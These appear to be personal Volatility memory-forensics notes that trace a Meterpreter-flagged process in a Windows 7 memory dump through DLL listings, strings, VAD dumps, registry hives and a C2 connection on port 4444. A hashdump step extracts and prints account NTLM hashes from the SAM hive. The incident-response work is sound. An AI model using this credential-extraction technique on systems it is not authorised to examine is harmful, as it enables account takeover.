luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 malfind -p 2004 -D W7dump/malfind/
```
upload to virustotal

```
https://www.virustotal.com/#/file/fb3b84264df41ed42dd67e2a0423df4c00f3b2d193c8ba1a0e95ec0a87dafe8f/detection
```
It can detect as Meterpreter

**Using dlllist**
```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 dlllist -p 2004
Volatility Foundation Volatility Framework 2.6
************************************************************************
lol[1].exe pid:   2004
Command line : "C:\Users\vulnerable\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\QULH211E\lol[1].exe" 
Note: use ldrmodules for listing DLLs in Wow64 processes


Base                             Size          LoadCount Path
------------------ ------------------ ------------------ ----
0x0000000000400000            0x16000             0xffff C:\Users\vulnerable\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\QULH211E\lol[1].exe
0x0000000076fa0000           0x1a9000             0xffff C:\Windows\SYSTEM32\ntdll.dll
0x0000000074c40000            0x3f000                0x3 C:\Windows\SYSTEM32\wow64.dll
0x0000000074be0000            0x5c000                0x1 C:\Windows\SYSTEM32\wow64win.dll
0x0000000074c90000             0x8000                0x1 C:\Windows\SYSTEM32\wow64cpu.dll
```
dump dll

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 dlldump -p 2004 --dump-dir W7dump/
Volatility Foundation Volatility Framework 2.6
Process(V)         Name                 Module Base        Module Name          Result
------------------ -------------------- ------------------ -------------------- ------
0xfffffa800193bb30 lol[1].exe           0x0000000000400000 lol[1].exe           OK: module.2004.3f33bb30.400000.dll
0xfffffa800193bb30 lol[1].exe           0x0000000076fa0000 ntdll.dll            OK: module.2004.3f33bb30.76fa0000.dll
0xfffffa800193bb30 lol[1].exe           0x0000000074c90000 wow64cpu.dll         OK: module.2004.3f33bb30.74c90000.dll
0xfffffa800193bb30 lol[1].exe           0x0000000074c40000 wow64.dll            OK: module.2004.3f33bb30.74c40000.dll
0xfffffa800193bb30 lol[1].exe           0x0000000074be0000 wow64win.dll         OK: module.2004.3f33bb30.74be0000.dll
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ ls W7dump/
module.2004.3f33bb30.400000.dll    module.2004.3f33bb30.74c40000.dll  module.2004.3f33bb30.76fa0000.dll
module.2004.3f33bb30.74be0000.dll  module.2004.3f33bb30.74c90000.dll
```
Uploaded `module.2004.3f33bb30.400000.dll ` to virustotal and found following result

```
https://www.virustotal.com/#/file/82e47e78667fc1b0b2de4afd29c17d6a647e22ce96e4f9fffed0f0878b685d72/detection
```
it can only show as trojan but not specific

Looking with strings command

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ strings W7dump/module.2004.3f33bb30.400000.dll
!This program cannot be run in DOS mode.
Rich
.text
`.rdata
@.data
.rsrc
eVu4
|#h(
tJyE
Ua(S
_^[]
_d[]
	CY%
	]AK5
	|q/
2VqfX
!x(Z
;}$u
D$$[[aYZQ
]h32
hws2_ThLw&
TPh)
PPPP@P@Ph
6j@h
VSWh
}(Xh
WhunMa
u	_^[
RPwS
tdQsPF
QRPS
tC3q
v>jJh
PQa`
`	Ak<
1jb@
Uc[_
sP/R
_^@[]
hT@A
EX@A
WVS3
 SVW|e
6X@A
Y~p{
v$N3a
KJ@?@A
/'K/
IJA/@H//
.A?v
!HWv
IOv"
5OvM
Pvp"
wkLOv15Ov
QOvXUOv#ROv
Ov	5Ov,TOvZFOv
Ov~ZOvR
2OvOEWv
SOv\?Ovy
Pv/2Ov
SOv<-Ov
)<vp
w;vQ
+3vQ
:3v5
z4vQu3v
8vy=3vBA3vV
63vH1<v
G4vx
MbP?
(null)
0123456789abcdef
0123456789ABCDEF
0123456789abcdef
0123456789ABCDEF
0123456789
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@
@@@@@@
 !"#$%&'()*+,-./0123@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
_iob
fprintf
strchr
_pctype
__mb_cur_max
exit
atoi
_isctype
printf
signal
malloc
calloc
fflush
fclose
perror
fopen
qsort
_ftol
strncpy
strstr
strncmp
free
_errno
__p__wenviron
__p__environ
realloc
strspn
modf
strerror
wcscpy
wcslen
_close
wcsncmp
strrchr
MSVCRT.dll
__dllonexit
_onexit
_exit
_XcptFilter
__p___initenv
__getmainargs
_initterm
__setusermatherr
_adjust_fdiv
__p__commode
__p__fmode
__set_app_type
_except_handler3
_controlfp
SetLastError
FreeEnvironmentStringsW
GetEnvironmentStringsW
GlobalFree
GetCommandLineW
TlsAlloc
TlsFree
DuplicateHandle
GetCurrentProcess
SetHandleInformation
CloseHandle
GetSystemTimeAsFileTime
FileTimeToSystemTime
GetTimeZoneInformation
FileTimeToLocalFileTime
SystemTimeToFileTime
SystemTimeToTzSpecificLocalTime
Sleep
FormatMessageA
GetLastError
WaitForSingleObject
CreateEventA
SetStdHandle
SetFilePointer
CreateFileA
CreateFileW
GetOverlappedResult
DeviceIoControl
GetFileInformationByHandle
LocalFree
GetFileType
CreateMutexA
InitializeCriticalSection
DeleteCriticalSection
EnterCriticalSection
ReleaseMutex
SetEvent
LeaveCriticalSection
TerminateProcess
GetExitCodeProcess
GetVersionExA
GetProcAddress
LoadLibraryA
WriteFile
ReadFile
PeekNamedPipe
KERNEL32.dll
AllocateAndInitializeSid
FreeSid
ADVAPI32.dll
WSOCK32.dll
WSASend
WSARecv
WS2_32.dll
_strnicmp
_strdup
```

**Using handles plugin**

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 handles -t Mutant -p 2004
Volatility Foundation Volatility Framework 2.6
Offset(V)             Pid             Handle             Access Type             Details
------------------ ------ ------------------ ------------------ ---------------- -------
0xfffffa80016f9cb0   2004               0x30           0x1f0001 Mutant           
0xfffffa8001c77290   2004               0xa4           0x1f0001 Mutant           
0xfffffa80018db580   2004               0xa8           0x1f0001 Mutant           
0xfffffa8002942130   2004               0xb0           0x1f0001 Mutant           
0xfffffa8001c78da0   2004               0xbc           0x1f0001 Mutant           
```
if it shows details we can search at google for what types of malware. But in this case, there is nothing.

**Using Vaddump plugin**

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 vaddump -p 2004 -D W7dump/
Volatility Foundation Volatility Framework 2.6
Pid        Process              Start              End                Result
---------- -------------------- ------------------ ------------------ ------
      2004 lol[1].exe           0x0000000074c90000 0x0000000074c97fff W7dump/lol[1].exe.3f33bb30.0x0000000074c90000-0x0000000074c97fff.dmp
      2004 lol[1].exe           0x0000000002530000 0x000000000256ffff W7dump/lol[1].exe.3f33bb30.0x0000000002530000-0x000000000256ffff.dmp
      2004 lol[1].exe           0x0000000000400000 0x0000000000415fff W7dump/lol[1].exe.3f33bb30.0x0000000000400000-0x0000000000415fff.dmp
      2004 lol[1].exe           0x0000000000190000 0x0000000000193fff W7dump/lol[1].exe.3f33bb30.0x0000000000190000-0x0000000000193fff.dmp
      2004 lol[1].exe           0x0000000000040000 0x0000000000040fff W7dump/lol[1].exe.3f33bb30.0x0000000000040000-0x0000000000040fff.dmp
      2004 lol[1].exe           0x0000000000020000 0x0000000000020fff W7dump/lol[1].exe.3f33bb30.0x0000000000020000-0x0000000000020fff.dmp
      2004 lol[1].exe           0x0000000000010000 0x000000000001ffff W7dump/lol[1].exe.3f33bb30.0x0000000000010000-0x000000000001ffff.dmp
      2004 lol[1].exe           0x0000000000030000 0x0000000000030fff W7dump/lol[1].exe.3f33bb30.0x0000000000030000-0x0000000000030fff.dmp
      2004 lol[1].exe           0x0000000000050000 0x000000000008ffff W7dump/lol[1].exe.3f33bb30.0x0000000000050000-0x000000000008ffff.dmp
      2004 lol[1].exe           0x0000000000090000 0x000000000018ffff W7dump/lol[1].exe.3f33bb30.0x0000000000090000-0x000000000018ffff.dmp
      2004 lol[1].exe           0x0000000000280000 0x000000000028ffff W7dump/lol[1].exe.3f33bb30.0x0000000000280000-0x000000000028ffff.dmp
      2004 lol[1].exe           0x0000000000220000 0x0000000000220fff W7dump/lol[1].exe.3f33bb30.0x0000000000220000-0x0000000000220fff.dmp
      2004 lol[1].exe           0x00000000001b0000 0x0000000000216fff W7dump/lol[1].exe.3f33bb30.0x00000000001b0000-0x0000000000216fff.dmp
      2004 lol[1].exe           0x00000000001a0000 0x00000000001a0fff W7dump/lol[1].exe.3f33bb30.0x00000000001a0000-0x00000000001a0fff.dmp
      2004 lol[1].exe           0x0000000000260000 0x0000000000265fff W7dump/lol[1].exe.3f33bb30.0x0000000000260000-0x0000000000265fff.dmp
      2004 lol[1].exe           0x0000000000230000 0x000000000025bfff W7dump/lol[1].exe.3f33bb30.0x0000000000230000-0x000000000025bfff.dmp
      2004 lol[1].exe           0x0000000000270000 0x0000000000270fff W7dump/lol[1].exe.3f33bb30.0x0000000000270000-0x0000000000270fff.dmp
      2004 lol[1].exe           0x0000000000310000 0x0000000000340fff W7dump/lol[1].exe.3f33bb30.0x0000000000310000-0x0000000000340fff.dmp
      2004 lol[1].exe           0x0000000000290000 0x000000000030ffff W7dump/lol[1].exe.3f33bb30.0x0000000000290000-0x000000000030ffff.dmp
      2004 lol[1].exe           0x0000000000390000 0x00000000003cffff W7dump/lol[1].exe.3f33bb30.0x0000000000390000-0x00000000003cffff.dmp
      2004 lol[1].exe           0x00000000003d0000 0x00000000003f0fff W7dump/lol[1].exe.3f33bb30.0x00000000003d0000-0x00000000003f0fff.dmp
      2004 lol[1].exe           0x0000000000a60000 0x0000000000be0fff W7dump/lol[1].exe.3f33bb30.0x0000000000a60000-0x0000000000be0fff.dmp
      2004 lol[1].exe           0x0000000000600000 0x00000000008cefff W7dump/lol[1].exe.3f33bb30.0x0000000000600000-0x00000000008cefff.dmp
      2004 lol[1].exe           0x0000000000490000 0x00000000004cffff W7dump/lol[1].exe.3f33bb30.0x0000000000490000-0x00000000004cffff.dmp
      2004 lol[1].exe           0x0000000000420000 0x0000000000481fff W7dump/lol[1].exe.3f33bb30.0x0000000000420000-0x0000000000481fff.dmp
      2004 lol[1].exe           0x0000000000500000 0x00000000005fffff W7dump/lol[1].exe.3f33bb30.0x0000000000500000-0x00000000005fffff.dmp
      2004 lol[1].exe           0x00000000008d0000 0x0000000000a57fff W7dump/lol[1].exe.3f33bb30.0x00000000008d0000-0x0000000000a57fff.dmp
      2004 lol[1].exe           0x00000000021f0000 0x00000000022effff W7dump/lol[1].exe.3f33bb30.0x00000000021f0000-0x00000000022effff.dmp
      2004 lol[1].exe           0x00000000020f0000 0x00000000021effff W7dump/lol[1].exe.3f33bb30.0x00000000020f0000-0x00000000021effff.dmp
      2004 lol[1].exe           0x0000000000bf0000 0x0000000001feffff W7dump/lol[1].exe.3f33bb30.0x0000000000bf0000-0x0000000001feffff.dmp
      2004 lol[1].exe           0x00000000023f0000 0x000000000244bfff W7dump/lol[1].exe.3f33bb30.0x00000000023f0000-0x000000000244bfff.dmp
      2004 lol[1].exe           0x00000000022f0000 0x00000000023effff W7dump/lol[1].exe.3f33bb30.0x00000000022f0000-0x00000000023effff.dmp
      2004 lol[1].exe           0x0000000002450000 0x000000000250ffff W7dump/lol[1].exe.3f33bb30.0x0000000002450000-0x000000000250ffff.dmp
      2004 lol[1].exe           0x0000000071270000 0x0000000071276fff W7dump/lol[1].exe.3f33bb30.0x0000000071270000-0x0000000071276fff.dmp
      2004 lol[1].exe           0x00000000028b0000 0x00000000028effff W7dump/lol[1].exe.3f33bb30.0x00000000028b0000-0x00000000028effff.dmp
      2004 lol[1].exe           0x0000000002670000 0x000000000276ffff W7dump/lol[1].exe.3f33bb30.0x0000000002670000-0x000000000276ffff.dmp
      2004 lol[1].exe           0x0000000002570000 0x000000000266ffff W7dump/lol[1].exe.3f33bb30.0x0000000002570000-0x000000000266ffff.dmp
      2004 lol[1].exe           0x00000000027b0000 0x00000000028affff W7dump/lol[1].exe.3f33bb30.0x00000000027b0000-0x00000000028affff.dmp
      2004 lol[1].exe           0x0000000002770000 0x00000000027affff W7dump/lol[1].exe.3f33bb30.0x0000000002770000-0x00000000027affff.dmp
      2004 lol[1].exe           0x0000000002c70000 0x0000000002caffff W7dump/lol[1].exe.3f33bb30.0x0000000002c70000-0x0000000002caffff.dmp
      2004 lol[1].exe           0x0000000002a30000 0x0000000002b2ffff W7dump/lol[1].exe.3f33bb30.0x0000000002a30000-0x0000000002b2ffff.dmp
      2004 lol[1].exe           0x00000000029f0000 0x0000000002a2ffff W7dump/lol[1].exe.3f33bb30.0x00000000029f0000-0x0000000002a2ffff.dmp
      2004 lol[1].exe           0x00000000028f0000 0x00000000029effff W7dump/lol[1].exe.3f33bb30.0x00000000028f0000-0x00000000029effff.dmp
      2004 lol[1].exe           0x0000000002b70000 0x0000000002c6ffff W7dump/lol[1].exe.3f33bb30.0x0000000002b70000-0x0000000002c6ffff.dmp
      2004 lol[1].exe           0x0000000002b30000 0x0000000002b6ffff W7dump/lol[1].exe.3f33bb30.0x0000000002b30000-0x0000000002b6ffff.dmp
      2004 lol[1].exe           0x0000000071210000 0x000000007121efff W7dump/lol[1].exe.3f33bb30.0x0000000071210000-0x000000007121efff.dmp
      2004 lol[1].exe           0x0000000002cb0000 0x0000000002daffff W7dump/lol[1].exe.3f33bb30.0x0000000002cb0000-0x0000000002daffff.dmp
      2004 lol[1].exe           0x0000000071220000 0x0000000071230fff W7dump/lol[1].exe.3f33bb30.0x0000000071220000-0x0000000071230fff.dmp
      2004 lol[1].exe           0x0000000074750000 0x0000000074754fff W7dump/lol[1].exe.3f33bb30.0x0000000074750000-0x0000000074754fff.dmp
      2004 lol[1].exe           0x00000000729b0000 0x0000000072a07fff W7dump/lol[1].exe.3f33bb30.0x00000000729b0000-0x0000000072a07fff.dmp
      2004 lol[1].exe           0x00000000713e0000 0x00000000713f8fff W7dump/lol[1].exe.3f33bb30.0x00000000713e0000-0x00000000713f8fff.dmp
      2004 lol[1].exe           0x0000000071280000 0x0000000071291fff W7dump/lol[1].exe.3f33bb30.0x0000000071280000-0x0000000071291fff.dmp
      2004 lol[1].exe           0x00000000713d0000 0x00000000713dafff W7dump/lol[1].exe.3f33bb30.0x00000000713d0000-0x00000000713dafff.dmp
      2004 lol[1].exe           0x0000000072440000 0x0000000072471fff W7dump/lol[1].exe.3f33bb30.0x0000000072440000-0x0000000072471fff.dmp
      2004 lol[1].exe           0x0000000071500000 0x0000000071508fff W7dump/lol[1].exe.3f33bb30.0x0000000071500000-0x0000000071508fff.dmp
      2004 lol[1].exe           0x0000000072960000 0x00000000729aefff W7dump/lol[1].exe.3f33bb30.0x0000000072960000-0x00000000729aefff.dmp
      2004 lol[1].exe           0x0000000074690000 0x0000000074696fff W7dump/lol[1].exe.3f33bb30.0x0000000074690000-0x0000000074696fff.dmp
      2004 lol[1].exe           0x0000000074560000 0x000000007456cfff W7dump/lol[1].exe.3f33bb30.0x0000000074560000-0x000000007456cfff.dmp
      2004 lol[1].exe           0x0000000072b40000 0x0000000072b56fff W7dump/lol[1].exe.3f33bb30.0x0000000072b40000-0x0000000072b56fff.dmp
      2004 lol[1].exe           0x0000000074570000 0x0000000074581fff W7dump/lol[1].exe.3f33bb30.0x0000000074570000-0x0000000074581fff.dmp
      2004 lol[1].exe           0x00000000746a0000 0x00000000746bbfff W7dump/lol[1].exe.3f33bb30.0x00000000746a0000-0x00000000746bbfff.dmp
      2004 lol[1].exe           0x0000000074950000 0x000000007498afff W7dump/lol[1].exe.3f33bb30.0x0000000074950000-0x000000007498afff.dmp
      2004 lol[1].exe           0x00000000747f0000 0x000000007482bfff W7dump/lol[1].exe.3f33bb30.0x00000000747f0000-0x000000007482bfff.dmp
      2004 lol[1].exe           0x00000000748e0000 0x00000000748eafff W7dump/lol[1].exe.3f33bb30.0x00000000748e0000-0x00000000748eafff.dmp
      2004 lol[1].exe           0x0000000074be0000 0x0000000074c3bfff W7dump/lol[1].exe.3f33bb30.0x0000000074be0000-0x0000000074c3bfff.dmp
      2004 lol[1].exe           0x0000000074990000 0x00000000749a5fff W7dump/lol[1].exe.3f33bb30.0x0000000074990000-0x00000000749a5fff.dmp
      2004 lol[1].exe           0x0000000074b90000 0x0000000074bdbfff W7dump/lol[1].exe.3f33bb30.0x0000000074b90000-0x0000000074bdbfff.dmp
      2004 lol[1].exe           0x0000000074c40000 0x0000000074c7efff W7dump/lol[1].exe.3f33bb30.0x0000000074c40000-0x0000000074c7efff.dmp
      2004 lol[1].exe           0x0000000076d80000 0x0000000076e9efff W7dump/lol[1].exe.3f33bb30.0x0000000076d80000-0x0000000076e9efff.dmp
      2004 lol[1].exe           0x0000000076320000 0x00000000763cbfff W7dump/lol[1].exe.3f33bb30.0x0000000076320000-0x00000000763cbfff.dmp
      2004 lol[1].exe           0x0000000075190000 0x00000000751a8fff W7dump/lol[1].exe.3f33bb30.0x0000000075190000-0x00000000751a8fff.dmp
      2004 lol[1].exe           0x0000000074da0000 0x0000000074e6bfff W7dump/lol[1].exe.3f33bb30.0x0000000074da0000-0x0000000074e6bfff.dmp
      2004 lol[1].exe           0x0000000074ce0000 0x0000000074d3ffff W7dump/lol[1].exe.3f33bb30.0x0000000074ce0000-0x0000000074d3ffff.dmp
      2004 lol[1].exe           0x0000000074cd0000 0x0000000074cdbfff W7dump/lol[1].exe.3f33bb30.0x0000000074cd0000-0x0000000074cdbfff.dmp
      2004 lol[1].exe           0x0000000074fd0000 0x00000000750c4fff W7dump/lol[1].exe.3f33bb30.0x0000000074fd0000-0x00000000750c4fff.dmp
      2004 lol[1].exe           0x0000000074e70000 0x0000000074fcbfff W7dump/lol[1].exe.3f33bb30.0x0000000074e70000-0x0000000074fcbfff.dmp
      2004 lol[1].exe           0x0000000075100000 0x000000007510bfff W7dump/lol[1].exe.3f33bb30.0x0000000075100000-0x000000007510bfff.dmp
      2004 lol[1].exe           0x0000000076170000 0x00000000761b5fff W7dump/lol[1].exe.3f33bb30.0x0000000076170000-0x00000000761b5fff.dmp
      2004 lol[1].exe           0x00000000753b0000 0x00000000753b9fff W7dump/lol[1].exe.3f33bb30.0x00000000753b0000-0x00000000753b9fff.dmp
      2004 lol[1].exe           0x00000000751b0000 0x00000000753aafff W7dump/lol[1].exe.3f33bb30.0x00000000751b0000-0x00000000753aafff.dmp
      2004 lol[1].exe           0x00000000760d0000 0x000000007616cfff W7dump/lol[1].exe.3f33bb30.0x00000000760d0000-0x000000007616cfff.dmp
      2004 lol[1].exe           0x0000000075480000 0x00000000760c9fff W7dump/lol[1].exe.3f33bb30.0x0000000075480000-0x00000000760c9fff.dmp
      2004 lol[1].exe           0x00000000761c0000 0x00000000762bffff W7dump/lol[1].exe.3f33bb30.0x00000000761c0000-0x00000000762bffff.dmp
      2004 lol[1].exe           0x00000000762c0000 0x000000007631ffff W7dump/lol[1].exe.3f33bb30.0x00000000762c0000-0x000000007631ffff.dmp
      2004 lol[1].exe           0x00000000768e0000 0x00000000769cffff W7dump/lol[1].exe.3f33bb30.0x00000000768e0000-0x00000000769cffff.dmp
      2004 lol[1].exe           0x00000000764e0000 0x00000000765effff W7dump/lol[1].exe.3f33bb30.0x00000000764e0000-0x00000000765effff.dmp
      2004 lol[1].exe           0x00000000763e0000 0x000000007647ffff W7dump/lol[1].exe.3f33bb30.0x00000000763e0000-0x000000007647ffff.dmp
      2004 lol[1].exe           0x00000000764d0000 0x00000000764d4fff W7dump/lol[1].exe.3f33bb30.0x00000000764d0000-0x00000000764d4fff.dmp
      2004 lol[1].exe           0x0000000076710000 0x0000000076845fff W7dump/lol[1].exe.3f33bb30.0x0000000076710000-0x0000000076845fff.dmp
      2004 lol[1].exe           0x00000000765f0000 0x000000007670cfff W7dump/lol[1].exe.3f33bb30.0x00000000765f0000-0x000000007670cfff.dmp
      2004 lol[1].exe           0x0000000076850000 0x00000000768defff W7dump/lol[1].exe.3f33bb30.0x0000000076850000-0x00000000768defff.dmp
      2004 lol[1].exe           0x0000000076a80000 0x0000000076ab4fff W7dump/lol[1].exe.3f33bb30.0x0000000076a80000-0x0000000076ab4fff.dmp
      2004 lol[1].exe           0x00000000769f0000 0x0000000076a7ffff W7dump/lol[1].exe.3f33bb30.0x00000000769f0000-0x0000000076a7ffff.dmp
      2004 lol[1].exe           0x0000000076c90000 0x0000000076ce6fff W7dump/lol[1].exe.3f33bb30.0x0000000076c90000-0x0000000076ce6fff.dmp
      2004 lol[1].exe           0x000000007efb0000 0x000000007efd2fff W7dump/lol[1].exe.3f33bb30.0x000000007efb0000-0x000000007efd2fff.dmp
      2004 lol[1].exe           0x000000007ef9e000 0x000000007efa0fff W7dump/lol[1].exe.3f33bb30.0x000000007ef9e000-0x000000007efa0fff.dmp
      2004 lol[1].exe           0x0000000077180000 0x00000000772fffff W7dump/lol[1].exe.3f33bb30.0x0000000077180000-0x00000000772fffff.dmp
      2004 lol[1].exe           0x0000000076fa0000 0x0000000077148fff W7dump/lol[1].exe.3f33bb30.0x0000000076fa0000-0x0000000077148fff.dmp
      2004 lol[1].exe           0x0000000076ea0000 0x0000000076f99fff W7dump/lol[1].exe.3f33bb30.0x0000000076ea0000-0x0000000076f99fff.dmp
      2004 lol[1].exe           0x0000000077150000 0x0000000077155fff W7dump/lol[1].exe.3f33bb30.0x0000000077150000-0x0000000077155fff.dmp
      2004 lol[1].exe           0x000000007ef98000 0x000000007ef9afff W7dump/lol[1].exe.3f33bb30.0x000000007ef98000-0x000000007ef9afff.dmp
      2004 lol[1].exe           0x000000007ef9b000 0x000000007ef9dfff W7dump/lol[1].exe.3f33bb30.0x000000007ef9b000-0x000000007ef9dfff.dmp
      2004 lol[1].exe           0x000000007efa4000 0x000000007efa6fff W7dump/lol[1].exe.3f33bb30.0x000000007efa4000-0x000000007efa6fff.dmp
      2004 lol[1].exe           0x000000007efa1000 0x000000007efa3fff W7dump/lol[1].exe.3f33bb30.0x000000007efa1000-0x000000007efa3fff.dmp
      2004 lol[1].exe           0x000000007efad000 0x000000007efaffff W7dump/lol[1].exe.3f33bb30.0x000000007efad000-0x000000007efaffff.dmp
      2004 lol[1].exe           0x000000007efa7000 0x000000007efa9fff W7dump/lol[1].exe.3f33bb30.0x000000007efa7000-0x000000007efa9fff.dmp
      2004 lol[1].exe           0x000000007f0e0000 0x000000007ffdffff W7dump/lol[1].exe.3f33bb30.0x000000007f0e0000-0x000000007ffdffff.dmp
      2004 lol[1].exe           0x000000007efde000 0x000000007efdefff W7dump/lol[1].exe.3f33bb30.0x000000007efde000-0x000000007efdefff.dmp
      2004 lol[1].exe           0x000000007efdb000 0x000000007efddfff W7dump/lol[1].exe.3f33bb30.0x000000007efdb000-0x000000007efddfff.dmp
      2004 lol[1].exe           0x000000007efd5000 0x000000007efd7fff W7dump/lol[1].exe.3f33bb30.0x000000007efd5000-0x000000007efd7fff.dmp
      2004 lol[1].exe           0x000000007efdf000 0x000000007efdffff W7dump/lol[1].exe.3f33bb30.0x000000007efdf000-0x000000007efdffff.dmp
      2004 lol[1].exe           0x000000007efe0000 0x000000007f0dffff W7dump/lol[1].exe.3f33bb30.0x000000007efe0000-0x000000007f0dffff.dmp
      2004 lol[1].exe           0x000000007ffe0000 0x000000007ffeffff W7dump/lol[1].exe.3f33bb30.0x000000007ffe0000-0x000000007ffeffff.dmp
```
we can analysis dumped memory strings 

**Yarascan plugin**

```
sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 yarascan -Y "192.168.1.102"
```

**New user account?**

```
sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 hivelist

Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a008a0f410 0x000000003a5c3410 \SystemRoot\System32\Config\SAM
0xfffff8a008a66010 0x0000000039206010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a009061200 0x0000000032e5c200 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a00000d0b0 0x0000000027a3f0b0 [no name]
0xfffff8a000024010 0x00000000278a4010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a00004e010 0x000000002784e010 \REGISTRY\MACHINE\HARDWARE
0xfffff8a000df2010 0x0000000027abf010 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a00175e010 0x0000000022d9c010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a0060c2410 0x0000000017c52410 \REGISTRY\USER\.DEFAULT
0xfffff8a006b82010 0x000000003a936010 \SystemRoot\System32\Config\SECURITY
0xfffff8a006f7a010 0x000000002d6dd010 \??\C:\System Volume Information\Syscache.hve
0xfffff8a00733c010 0x000000000702d010 \??\C:\Users\vulnerable\ntuser.dat
0xfffff8a0073c8010 0x000000001de8a010 \??\C:\Users\vulnerable\AppData\Local\Microsoft\Windows\UsrClass.dat
```
hashdump

```
luna@lol:~/Downloads/volatility_2.6_lin64_standalone$ sudo ./volatility_2.6_lin64_standalone -f mem/memory.raw --profile Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a008a0f410
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vulnerable:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e3d4f1e69a2ee6cc0e01bec2a3c89e16:::
```

**Another Connection**
You already seen another connection with netscan
```
0x3f5d3cf0         TCPv4    192.168.1.103:49240            192.168.1.102:4444   ESTABLISHED      2264     sQWdlfFBP.exe
```
May be session 2
2264 and sQWdlfFBP.exe

Let's try with above methods

***References***
```
https://www.null0x4d5a.com/2018/03/memory-dump-analysis-of-donnys-system.html
https://technical.nttsecurity.com/post/102egyy/hunting-malware-with-memory-analysis
https://eforensicsmag.com/finding-advanced-malware-using-volatility/
https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#hashdump
```

